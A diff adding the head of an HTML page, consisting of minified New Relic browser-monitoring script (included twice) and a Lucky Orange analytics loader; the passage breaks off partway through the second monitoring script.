@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<script type="text/javascript">
+window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o||e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(t,e,n){function r(t){try{s.console&&console.log(t)}catch(e){}}var o,i=t("ee"),a=t(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,e,n){r(n.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,e){return t}).join(", ")))},{}],2:[function(t,e,n){function r(t,e,n,r,o){try{d?d-=1:i("err",[o||new UncaughtException(t,e,n)])}catch(s){try{i("ierr",[s,(new Date).getTime(),!0])}catch(c){}}return"function"==typeof f&&f.apply(this,a(arguments))}function UncaughtException(t,e,n){this.message=t||"Uncaught error with no additional information",this.sourceURL=e,this.line=n}function o(t){i("err",[t,(new Date).getTime()])}var i=t("handle"),a=t(16),s=t("ee"),c=t("loader"),f=window.onerror,u=!1,d=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(l){"stack"in l&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),u=!0)}s.on("fn-start",function(t,e,n){u&&(d+=1)}),s.on("fn-err",function(t,e,n){u&&(this.thrown=!0,o(n))}),s.on("fn-end",function(){u&&!this.thrown&&d>0&&(d-=1)}),s.on("internal-error",function(t){i("ierr",[t,(new Date).getTime(),!0])})},{}],3:[function(t,e,n){t("loader").features.ins=!0},{}],4:[function(t,e,n){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,w="fn"+h,v="bstTimer",y="pushState";t("loader").features.stn=!0,t(6);var g=NREUM.o.EV;o.on(m,function(t,e){var n=t[0];n instanceof g&&(this.bstStart=Date.now())}),o.on(w,function(t,e){var n=t[0];n instanceof g&&i("bst",[n,e,this.bstStart,Date.now()])}),a.on(m,function(t,e,n){this.bstStart=Date.now(),this.bstType=n}),a.on(w,function(t,e){i(v,[e,this.bstStart,Date.now(),this.bstType])}),s.on(m,function(){this.bstStart=Date.now()}),s.on(w,function(t,e){i(v,[e,this.bstStart,Date.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=Date.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,!1),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,e,n){function r(t){for(var e=t;e&&!e.hasOwnProperty(u);)e=Object.getPrototypeOf(e);e&&o(e)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,e){return t[1]}var a=t("ee").get("events"),s=t(17)(a),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";e.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,e){if(t[1]){var n=t[1];if("function"==typeof n){var r=c(n,"nr@wrapped",function(){return s(n,"fn-",null,n.name||"anonymous")});this.wrapped=t[1]=r}else"function"==typeof n.handleEvent&&s.inPlace(n,["handleEvent"],"fn-")}}),a.on(d+"-start",function(t){var e=this.wrapped;e&&(t[1]=e)})},{}],6:[function(t,e,n){var r=t("ee").get("history"),o=t(17)(r);e.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,e,n){var r=t("ee").get("raf"),o=t(17)(r),i="equestAnimationFrame";e.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,e,n){function r(t,e,n){t[0]=a(t[0],"fn-",null,n)}function o(t,e,n){this.method=n,this.timerDuration="number"==typeof t[1]?t[1]:0,t[0]=a(t[0],"fn-",this,n)}var i=t("ee").get("timer"),a=t(17)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";e.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],9:[function(t,e,n){function r(t,e){d.inPlace(e,["onreadystatechange"],"fn-",s)}function o(){var t=this,e=u.context(t);t.readyState>3&&!e.resolved&&(e.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,w,"fn-",s)}function i(t){v.push(t),h&&(g=-g,b.data=g)}function a(){for(var t=0;t<v.length;t++)r([],v[t]);v.length&&(v=[])}function s(t,e){return e}function c(t,e){for(var n in t)e[n]=t[n];return e}t(5);var f=t("ee"),u=f.get("xhr"),d=t(17)(u),l=NREUM.o,p=l.XHR,h=l.MO,m="readystatechange",w=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],v=[];e.exports=u;var y=window.XMLHttpRequest=function(t){var e=new p(t);try{u.emit("new-xhr",[e],e),e.addEventListener(m,o,!1)}catch(n){try{u.emit("internal-error",[n])}catch(r){}}return e};if(c(p,y),y.prototype=p.prototype,d.inPlace(y.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,e){r(t,e),i(e)}),u.on("open-xhr-start",r),h){var g=1,b=document.createTextNode(g);new h(a).observe(b,{characterData:!0})}else f.on("fn-end",function(t){t[0]&&t[0].type===m||a()})},{}],10:[function(t,e,n){function r(t){var e=this.params,n=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!e.aborted){if(n.duration=(new Date).getTime()-this.startTime,4===t.readyState){e.status=t.status;var i=o(t,this.lastSize);if(i&&(n.rxSize=i),this.sameOrigin){var a=t.getResponseHeader("X-NewRelic-App-Data");a&&(e.cat=a.split(", ").pop())}}else e.status=0;n.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[e,n,this.startTime])}}}function o(t,e){var n=t.responseType;if("json"===n&&null!==e)return e;var r="arraybuffer"===n||"blob"===n||"json"===n?t.response:t.responseText;return h(r)}function i(t,e){var n=c(e),r=t.params;r.host=n.hostname+":"+n.port,r.pathname=n.pathname,t.sameOrigin=n.sameOrigin}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var e=this;e.totalCbs=0,e.called=0,e.cbTime=0,e.end=r,e.ended=!1,e.xhrGuids={},e.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){e.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,e){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&e.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,e){var n=this.metrics,r=t[0],o=this;if(n&&r){var i=h(r);i&&(n.txSize=i)}this.startTime=(new Date).getTime(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof e.onload))&&o.end(e)}catch(n){try{f.emit("internal-error",[n])}catch(r){}}};for(var a=0;a<d;a++)e.addEventListener(u[a],this.listener,!1)}),f.on("xhr-cb-time",function(t,e,n){this.cbTime+=t,e?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof n.onload||this.end(n)}),f.on("xhr-load-added",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&!this.xhrGuids[n]&&(this.xhrGuids[n]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&this.xhrGuids[n]&&(delete this.xhrGuids[n],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],e)}),f.on("removeEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],e)}),f.on("fn-start",function(t,e,n){e instanceof m&&("onload"===n&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=(new Date).getTime()))}),f.on("fn-end",function(t,e){this.xhrCbStart&&f.emit("xhr-cb-time",[(new Date).getTime()-this.xhrCbStart,this.onload,e],e)})}},{}],11:[function(t,e,n){e.exports=function(t){var e=document.createElement("a"),n=window.location,r={};e.href=t,r.port=e.port;var o=e.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=e.hostname||n.hostname,r.pathname=e.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!e.protocol||":"===e.protocol||e.protocol===n.protocol,a=e.hostname===document.domain&&e.port===n.port;return r.sameOrigin=i&&(!e.hostname||a),r}},{}],12:[function(t,e,n){function r(){}function o(t,e,n){return function(){return i(t,[(new Date).getTime()].concat(s(arguments)),e?null:this,n),e?void 0:this}}var i=t("handle"),a=t(15),s=t(16),c=t("ee").get("tracer"),f=NREUM;"undefined"==typeof window.newrelic&&(newrelic=f);var u=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit"],d="api-",l=d+"ixn-";a(u,function(t,e){f[e]=o(d+e,!0,"api")}),f.addPageAction=o(d+"addPageAction",!0),e.exports=newrelic,f.interaction=function(){return(new r).get()};var p=r.prototype={createTracer:function(t,e){var n={},r=this,o="function"==typeof e;return i(l+"tracer",[Date.now(),t,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[Date.now(),r,o],n),o)try{return e.apply(this,arguments)}finally{c.emit("fn-end",[Date.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){p[e]=o(l+e)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,(new Date).getTime()])}},{}],13:[function(t,e,n){e.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(e){return}}}},{}],14:[function(t,e,n){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),e.exports=r},{}],15:[function(t,e,n){function r(t,e){var n=[],r="",i=0;for(r in t)o.call(t,r)&&(n[i]=e(r,t[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],16:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(o<0?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=r},{}],17:[function(t,e,n){function r(t){return!(t&&"function"==typeof t&&t.apply&&!t[a])}var o=t("ee"),i=t(16),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;e.exports=function(t){function e(t,e,n,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof n?n(r,a):n||{}}catch(u){d([u,"",[r,a,o],s])}f(e+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(l){throw f(e+"err",[r,a,l],s),l}finally{f(e+"end",[r,a,c],s)}}return r(t)?t:(e||(e=""),nrWrapper[a]=t,u(t,nrWrapper),nrWrapper)}function n(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)s=n[c],a=t[s],r(a)||(t[s]=e(a,f?s+o:o,i,s))}function f(e,n,r){if(!c){c=!0;try{t.emit(e,n,r)}catch(o){d([o,e,n,r])}c=!1}}function u(t,e){if(Object.defineProperty&&Object.keys)try{var n=Object.keys(t);return n.forEach(function(n){Object.defineProperty(e,n,{get:function(){return t[n]},set:function(e){return t[n]=e,e}})}),e}catch(r){d([r])}for(var o in t)s.call(t,o)&&(e[o]=t[o]);return e}function d(e){try{t.emit("internal-error",e)}catch(n){}}return t||(t=o),e.inPlace=n,e.flag=a,e}},{}],ee:[function(t,e,n){function r(){}function o(t){function e(t){return t&&t instanceof r?t:t?s(t,a,i):i()}function n(n,r,o){t&&t(n,r,o);for(var i=e(o),a=l(n),s=a.length,c=0;c<s;c++)a[c].apply(i,r);var u=f[w[n]];return u&&u.push([v,n,r,i]),i}function d(t,e){m[t]=l(t).concat(e)}function l(t){return m[t]||[]}function p(t){return u[t]=u[t]||o(n)}function h(t,e){c(t,function(t,n){e=e||"feature",w[n]=e,e in f||(f[e]=[])})}var m={},w={},v={on:d,emit:n,get:p,listeners:l,context:e,buffer:h};return v}function i(){return new r}var a="nr@context",s=t("gos"),c=t(15),f={},u={},d=e.exports=o();d.backlog=f},{}],gos:[function(t,e,n){function r(t,e,n){if(o.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[e]=r,r}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){o.buffer([t],r),o.emit(t,e,n)}var o=t("ee").get("handle");e.exports=r,r.ee=o},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!g++){var t=y.info=NREUM.info,e=u.getElementsByTagName("script")[0];if(t&&t.licenseKey&&t.applicationID&&e){c(w,function(e,n){t[e]||(t[e]=n)});var n="https"===m.split(":")[0]||t.sslForHttp;y.proto=n?"https://":"http://",s("mark",["onload",a()],null,"api");var r=u.createElement("script");r.src=y.proto+t.agent,e.parentNode.insertBefore(r,e)}}}function o(){"complete"===u.readyState&&i()}function i(){s("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var s=t("handle"),c=t(15),f=window,u=f.document,d="addEventListener",l="attachEvent",p=f.XMLHttpRequest,h=p&&p.prototype;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:p,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver},t(12);var m=""+location,w={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-974.min.js"},v=p&&h&&h[d]&&!/CriOS/.test(navigator.userAgent),y=e.exports={offset:a(),origin:m,features:{},xhrWrappable:v};u[d]?(u[d]("DOMContentLoaded",i,!1),f[d]("load",r,!1)):(u[l]("onreadystatechange",o),f[l]("onload",r)),s("mark",["firstbyte",a()],null,"api");var g=0},{}]},{},["loader",2,10,4,3]);
+;NREUM.info={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",licenseKey:"618ef45929",applicationID:"8688659",sa:1}
+</script>
+<script type='text/javascript'>
+window.__wtw_lucky_site_id = 42619;
+	(function() {
+		var wa = document.createElement('script'); wa.type = 'text/javascript'; wa.async = true;
+		wa.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://cdn') + '.luckyorange.com/w.js';
+		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(wa, s);
+	  })();
+</script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={xpid:"VQYOWF9QCRACU1ZaAgcPXw=="};window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o||e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(t,e,n){function r(t){try{s.console&&console.log(t)}catch(e){}}var o,i=t("ee"),a=t(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,e,n){r(n.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,e){return t}).join(", ")))},{}],2:[function(t,e,n){function r(t,e,n,r,o){try{d?d-=1:i("err",[o||new UncaughtException(t,e,n)])}catch(s){try{i("ierr",[s,(new Date).getTime(),!0])}catch(c){}}return"function"==typeof f&&f.apply(this,a(arguments))}function UncaughtException(t,e,n){this.message=t||"Uncaught error with no additional information",this.sourceURL=e,this.line=n}function o(t){i("err",[t,(new Date).getTime()])}var i=t("handle"),a=t(16),s=t("ee"),c=t("loader"),f=window.onerror,u=!1,d=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(l){"stack"in l&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),u=!0)}s.on("fn-start",function(t,e,n){u&&(d+=1)}),s.on("fn-err",function(t,e,n){u&&(this.thrown=!0,o(n))}),s.on("fn-end",function(){u&&!this.thrown&&d>0&&(d-=1)}),s.on("internal-error",function(t){i("ierr",[t,(new Date).getTime(),!0])})},{}],3:[function(t,e,n){t("loader").features.ins=!0},{}],4:[function(t,e,n){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,w="fn"+h,v="bstTimer",y="pushState";t("loader").features.stn=!0,t(6);var g=NREUM.o.EV;o.on(m,function(t,e){var n=t[0];n instanceof g&&(this.bstStart=Date.now())}),o.on(w,function(t,e){var n=t[0];n instanceof g&&i("bst",[n,e,this.bstStart,Date.now()])}),a.on(m,function(t,e,n){this.bstStart=Date.now(),this.bstType=n}),a.on(w,function(t,e){i(v,[e,this.bstStart,Date.now(),this.bstType])}),s.on(m,function(){this.bstStart=Date.now()}),s.on(w,function(t,e){i(v,[e,this.bstStart,Date.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=Date.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,!1),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,e,n){function r(t){for(var e=t;e&&!e.hasOwnProperty(u);)e=Object.getPrototypeOf(e);e&&o(e)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,e){return t[1]}var a=t("ee").get("events"),s=t(17)(a),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";e.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,e){if(t[1]){var n=t[1];if("function"==typeof n){var r=c(n,"nr@wrapped",function(){return s(n,"fn-",null,n.name||"anonymous")});this.wrapped=t[1]=r}else"function"==typeof n.handleEvent&&s.inPlace(n,["handleEvent"],"fn-")}}),a.on(d+"-start",function(t){var e=this.wrapped;e&&(t[1]=e)})},{}],6:[function(t,e,n){var r=t("ee").get("history"),o=t(17)(r);e.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,e,n){var r=t("ee").get("raf"),o=t(17)(r),i="equestAnimationFrame";e.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,e,n){function r(t,e,n){t[0]=a(t[0],"fn-",null,n)}function o(t,e,n){this.method=n,this.timerDuration="number"==typeof t[1]?t[1]:0,t[0]=a(t[0],"fn-",this,n)}var i=t("ee").get("timer"),a=t(17)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";e.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],9:[function(t,e,n){function r(t,e){d.inPlace(e,["onreadystatechange"],"fn-",s)}function o(){var t=this,e=u.context(t);t.readyState>3&&!e.resolved&&(e.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,w,"fn-",s)}function i(t){v.push(t),h&&(g=-g,b.data=g)}function a(){for(var t=0;t<v.length;t++)r([],v[t]);v.length&&(v=[])}function s(t,e){return e}function c(t,e){for(var n in t)e[n]=t[n];return e}t(5);var f=t("ee"),u=f.get("xhr"),d=t(17)(u),l=NREUM.o,p=l.XHR,h=l.MO,m="readystatechange",w=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],v=[];e.exports=u;var y=window.XMLHttpRequest=function(t){var e=new p(t);try{u.emit("new-xhr",[e],e),e.addEventListener(m,o,!1)}catch(n){try{u.emit("internal-error",[n])}catch(r){}}return e};if(c(p,y),y.prototype=p.prototype,d.inPlace(y.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,e){r(t,e),i(e)}),u.on("open-xhr-start",r),h){var g=1,b=document.createTextNode(g);new h(a).observe(b,{characterData:!0})}else f.on("fn-end",function(t){t[0]&&t[0].type===m||a()})},{}],10:[function(t,e,n){function r(t){var e=this.params,n=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!e.aborted){if(n.duration=(new Date).getTime()-this.startTime,4===t.readyState){e.status=t.status;var i=o(t,this.lastSize);if(i&&(n.rxSize=i),this.sameOrigin){var a=t.getResponseHeader("X-NewRelic-App-Data");a&&(e.cat=a.split(", ").pop())}}else e.status=0;n.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[e,n,this.startTime])}}}function o(t,e){var n=t.responseType;if("json"===n&&null!==e)return e;var r="arraybuffer"===n||"blob"===n||"json"===n?t.response:t.responseText;return h(r)}function i(t,e){var n=c(e),r=t.params;r.host=n.hostname+":"+n.port,r.pathname=n.pathname,t.sameOrigin=n.sameOrigin}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var e=this;e.totalCbs=0,e.called=0,e.cbTime=0,e.end=r,e.ended=!1,e.xhrGuids={},e.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){e.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,e){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&e.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,e){var n=this.metrics,r=t[0],o=this;if(n&&r){var i=h(r);i&&(n.txSize=i)}this.startTime=(new Date).getTime(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof e.onload))&&o.end(e)}catch(n){try{f.emit("internal-error",[n])}catch(r){}}};for(var a=0;a<d;a++)e.addEventListener(u[a],this.listener,!1)}),f.on("xhr-cb-time",function(t,e,n){this.cbTime+=t,e?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof n.onload||this.end(n)}),f.on("xhr-load-added",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&!this.xhrGuids[n]&&(this.xhrGuids[n]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&this.xhrGuids[n]&&(delete this.xhrGuids[n],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],e)}),f.on("removeEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],e)}),f.on("fn-start",function(t,e,n){e instanceof m&&("onload"===n&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=(new Date).getTime()))}),f.on("fn-end",function(t,e){this.xhrCbStart&&f.emit("xhr-cb-time",[(new Date).getTime()-this.xhrCbStart,this.onload,e],e)})}},{}],11:[function(t,e,n){e.exports=function(t){var e=document.createElement("a"),n=window.location,r={};e.href=t,r.port=e.port;var o=e.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=e.hostname||n.hostname,r.pathname=e.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!e.protocol||":"===e.protocol||e.protocol===n.protocol,a=e.hostname===document.domain&&e.port===n.port;return r.sameOrigin=i&&(!e.hostname||a),r}},{}],12:[function(t,e,n){function r(){}function o(t,e,n){return function(){return i(t,[(new Date).getTime()].concat(s(arguments)),e?null:this,n),e?void 0:this}}var i=t("handle"),a=t(15),s=t(16),c=t("ee").get("tracer"),f=NREUM;"undefined"==typeof window.newrelic&&(newrelic=f);var u=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit"],d="api-",l=d+"ixn-";a(u,function(t,e){f[e]=o(d+e,!0,"api")}),f.addPageAction=o(d+"addPageAction",!0),e.exports=newrelic,f.interaction=function(){return(new r).get()};var p=r.prototype={createTracer:function(t,e){var n={},r=this,o="function"==typeof e;return i(l+"tracer",[Date.now(),t,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[Date.now(),r,o],n),o)try{return e.apply(this,arguments)}finally{c.emit("fn-end",[Date.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){p[e]=o(l+e)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,(new Date).getTime()])}},{}],13:[function(t,e,n){e.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(e){return}}}},{}],14:[function(t,e,n){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),e.exports=r},{}],15:[function(t,e,n){function r(t,e){var n=[],r="",i=0;for(r in t)o.call(t,r)&&(n[i]=e(r,t[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],16:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(o<0?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=r},{}],17:[function(t,e,n){function r(t){return!(t&&"function"==typeof t&&t.apply&&!t[a])}var o=t("ee"),i=t(16),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;e.exports=function(t){function e(t,e,n,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof n?n(r,a):n||{}}catch(u){d([u,"",[r,a,o],s])}f(e+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(l){throw f(e+"err",[r,a,l],s),l}finally{f(e+"end",[r,a,c],s)}}return r(t)?t:(e||(e=""),nrWrapper[a]=t,u(t,nrWrapper),nrWrapper)}function n(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)s=n[c],a=t[s],r(a)||(t[s]=e(a,f?s+o:o,i,s))}function f(e,n,r){if(!c){c=!0;try{t.emit(e,n,r)}catch(o){d([o,e,n,r])}c=!1}}function u(t,e){if(Object.defineProperty&&Object.keys)try{var n=Object.keys(t);return n.forEach(function(n){Object.defineProperty(e,n,{get:function(){return t[n]},set:function(e){return t[n]=e,e}})}),e}catch(r){d([r])}for(var o in t)s.call(t,o)&&(e[o]=t[o]);return e}function d(e){try{t.emit("internal-error",e)}catch(n){}}return t||(t=o),e.inPlace=n,e.flag=a,e}},{}],ee:[function(t,e,n){function 